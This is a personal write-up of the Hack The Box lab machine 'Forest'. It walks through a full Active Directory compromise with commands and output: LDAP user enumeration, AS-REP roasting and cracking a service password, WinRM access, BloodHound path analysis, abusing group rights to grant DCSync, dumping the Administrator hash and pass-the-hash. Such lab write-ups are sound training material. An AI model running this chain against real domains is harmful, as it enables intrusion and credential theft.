---
target_ip: 10.10.10.161
platform: HTB
difficulty: Easy
os: Windows
date_started: 2025-06-14
status: in_progress
services: ['kpasswd5', 'microsoft-ds', 'msrpc', 'netbios-ssn', 'kerberos-sec', 'domain', 'ldap', 'ncacn_http', 'http', 'tcpwrapped']
techniques_used: []
tools_used: [nmap]
---

# Forest

**Platform:** HTB | **Difficulty:** Easy | **OS:** Windows | **Date:** 14/06/2025

## Summary

## Reconnaissance

```bash
nmap -sC -sV -T4 10.10.10.161 -oA nmap/forest
```

| Port | Service      | Version                                         |
| ---- | ------------ | ----------------------------------------------- |
| 53   | domain       | Simple DNS Plus                                 |
| 88   | kerberos-sec | Microsoft Windows Kerberos                      |
| 135  | msrpc        | Microsoft Windows RPC                           |
| 139  | netbios-ssn  | Microsoft Windows netbios-ssn                   |
| 389  | ldap         | Microsoft Windows Active Directory LDAP         |
| 445  | microsoft-ds | Windows Server 2016 Standard 14393 microsoft-ds |
| 464  | kpasswd5     | N/A                                             |
| 593  | ncacn_http   | Microsoft Windows RPC over HTTP 1.0             |
| 636  | tcpwrapped   | N/A                                             |
| 3268 | ldap         | Microsoft Windows Active Directory LDAP         |
| 3269 | tcpwrapped   | N/A                                             |
| 5985 | http         | Microsoft HTTPAPI httpd 2.0                     |

## Enumeration

Firstly, I generated and appended a static hostname mapping entry to `/etc/hosts` to avoid possible DNS resolution issues later on with Kerberos.
```bash
nxc smb '10.10.10.161' --generate-hosts-file files/hosts && sudo tee -a /etc/hosts < files/hosts

tail -n 1 /etc/hosts
10.10.10.161     FOREST.htb.local FOREST
```

LDAP enumeration identified seven active domain users.
```bash
nxc ldap 'FOREST' -u '' -p '' -d 'htb.local' --active-users | awk '{print $5}' | grep -v '^[H,\[,-]' > files/users.txt && cat files/users.txt 


Administrator
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

## Exploitation

Testing the user list for AS-REP roasting revealed accounts with "Do Not Require Kerberos Pre-Authentication" enabled...
```bash
nxc ldap 'FOREST' -u files/users.txt  -p '' -d 'htb.local' --asreproast files/roast.txt     

...
LDAP        10.10.10.161    389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:d92213ff872a80624a412d802a52b446$...
```

The AS-REP hash cracked with `hashcat`, revealing the password `s3rvice`.
```bash
hashcat -m 18200 -a 0 files/roast.txt /usr/share/wordlists/rockyou.txt

...
$krb5asrep$23$svc-alfresco@HTB.LOCAL:b73c81fb8c33164c016884a6be75e669$2beb8c478e9b6f4b0b1ee2aeaba1821f22f189957bf8b9ee4f15f5ac1317a7c3678fd71f9fc0d926a3529dbfed42c26bf119bf475f96a38af3bdb1b0c6085cff57e63015e95b3fec76271c4736df2fb34c46edbca9614f05eee7e8c2c0e524aa2acd07de8a1b17feb7380c29ea75f86f328868bc893b9a36f41ba6f67ff3a02ff4ce1e2784868cc156b91ab5f5aa3a3f91e61fca6b61ab70dbd9e20a0f49a653078d638bf2588ad564c1c91d601cc07f7fc10b0e22f4b5803a0e8540eef8f2e1e9fd3e45525337b6ca0ef27788ae6ef610822c8e0147fd9b39919e8739a872ca3584d7658274:s3rvice
...
```

The credentials worked for WinRM access on port `5985`.
```bash
nxc winrm 'FOREST' -u 'svc-alfresco' -p 's3rvice' -d 'htb.local'

WINRM       10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) 
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

Used `evil-winrm` to get a remote shell.
```bash
evil-winrm -i 'FOREST' -u 'htb.local\svc-alfresco' -p 's3rvice'

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```

User flag was in `svc-alfresco`'s Desktop.
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> more ../Desktop/user.txt
```

## Privilege Escalation

SharpHound was already on the machine in the `svc-alfresco` user's home directory. I ran it to enumerate everything on the domain.
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco> .\hound.exe -c all --zipfilename loot.zip

...
 118 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2025-06-14T16:09:59.0652881-07:00|INFORMATION|SharpHound Enumeration Completed at 4:09 PM on 6/14/2025! Happy Graphing!
```

And downloaded it to my machine.
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco> download 20250614160957_loot.zip
                                        
Info: Downloading C:\Users\svc-alfresco\20250614160957_loot.zip to 20250614160957_loot.zip                  
```

So I started Bloodhound.
```bash
sudo ./bloodhound-cli containers start

[+] Checking the status of Docker and the Compose plugin...
[+] Starting the BloodHound environment
[+] Running `docker` to restart containers with docker-compose.yml...
```

Imported the SharpHound data `20250614160957_loot.zip` and run a Custom Cypher Query to view the shortest path from owned principles (`svc-alfesco`) to domain Tier 0:
```
MATCH p = allShortestPaths((u:User)-[:AbuseTGTDelegation|AllowedToDelegate|HasSIDHistory|ADCSESC1|CanPSRemote|HasSession|ADCSESC10a|CanRDP|MemberOf|ADCSESC10b|CoerceAndRelayNTLMToADCS|Owns|ADCSESC13|CoerceAndRelayNTLMToLDAP|OwnsLimitedRights|ADCSESC3|CoerceAndRelayNTLMToLDAPS|ReadGMSAPassword|ADCSESC4|CoerceAndRelayNTLMToSMB|ReadLAPSPassword|ADCSESC6a|CoerceToTGT|SameForestTrust|ADCSESC6b|Contains|SpoofSIDHistory|ADCSESC9a|DCFor|SQLAdmin|ADCSESC9b|DCSync|SyncedToEntraUser|AddAllowedToAct|DumpSMSAPassword|SyncLAPSPassword|AddKeyCredentialLink|ExecuteDCOM|WriteAccountRestrictions|AddMember|ForceChangePassword|WriteDacl|AddSelf|GPLink|WriteGPLink|AdminTo|GenericAll|WriteOwner|AllExtendedRights|GenericWrite|WriteOwnerLimitedRights|AllowedToAct|GoldenCert|WriteSPN*1..]->(b:Base))
WHERE "owned" IN split(u.system_tags, " ")
  AND "admin_tier_0" IN split(b.system_tags, " ")
RETURN p
LIMIT 1000
``` 

Bloodhound revealed that `svc-alfresco` was a part of the "Account Operators" group. This group can create users and add them to most groups, including "Exchange Windows Permissions". That group has `WriteDACL` permissions on the domain - normally needed for Exchange to work, but it creates a path to DCSync..
![[Pasted image 20250615014133.png]]
To perform the DCSync attack, I firstly created a new credential object and domain user account called "`wither`".
```powershell
$SecPass = ConvertTo-SecureString 'password' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\\wither', $SecPass)
New-ADUser -Name "wither" -SamAccountName "wither" -AccountPassword $SecPass -Enabled $true
```

The "Account Operators" membership of `svc-alfresco` allowed me to add `wither` to the "Exchange Windows Permissions" group.
```powershell
Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members wither
```

This provided the `WriteDACL` privileges I needed to grant it DCSync rights.
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -PrincipalIdentity wither -Rights DCSync -TargetIdentity "DC=htb,DC=local" -Credential $Cred -Verbose

...
Verbose: [Add-DomainObjectAcl] Granting principal CN=wither,CN=Users,DC=htb,DC=local 'DCSync' on DC=htb,DC=local
...
```
>[!info] Important to note, `-Credential` using `wither`'s credential object was vital here for the attack to work, as I needed `Add-DomainObjectAcl` to run under the context of that account (as it was a member of "Exchange Windows Permissions" and thus had permission to modify ACLs) and not `svc-alfresco`.


DCSync requested the `Administrator`'s password hash via domain replication through `secretsdump`.
```bash
wither@kali:~/CTF/HTB/Forest/files$ secretsdump.py 'HTB'/'wither':'password'@'FOREST' 

...
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
...
[*] Kerberos keys grabbed
...
[*] Cleaning up...
```

Pass-the-hash with this NTLM hash provided access to the `Administrator` account.
```bash
evil-winrm -i 'FOREST' -u 'htb.local\Administrator' -H 32693b11e6aa90eb43d32c72a07ceea6

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

And get the root flag in the `Administrator`'s Desktop.
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> more ..\Desktop\root.txt
```

## References

- [ASREPRoast \| NetExec](https://www.netexec.wiki/ldap-protocol/asreproast)
- [AS-REP Roasting \| Red Team Notes](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [bloodhoundce-resources/custom\_queries/BloodHound\_CE\_Custom\_Queries.md at main · CompassSecurity/bloodhoundce-resources · GitHub](https://github.com/CompassSecurity/bloodhoundce-resources/blob/main/custom_queries/BloodHound_CE_Custom_Queries.md)
- [HackTricks/windows-hardening/active-directory-methodology/dcsync.md at master · b4rdia/HackTricks · GitHub](https://github.com/b4rdia/HackTricks/blob/master/windows-hardening/active-directory-methodology/dcsync.md)
- [AD Series \| DC Sync Attacks. DCSync Attack is a type of “credential… \| by Urshila Ravindran \| Medium](https://medium.com/@urshilaravindran/ad-series-dc-sync-attacks-e76bb54308f5)

---
#forest #htb #easy #windows #netexec #asreproast #hashcat #evil-winrm #bloodhound #sharphound #dcsync #secretsdump #pass-the-hash
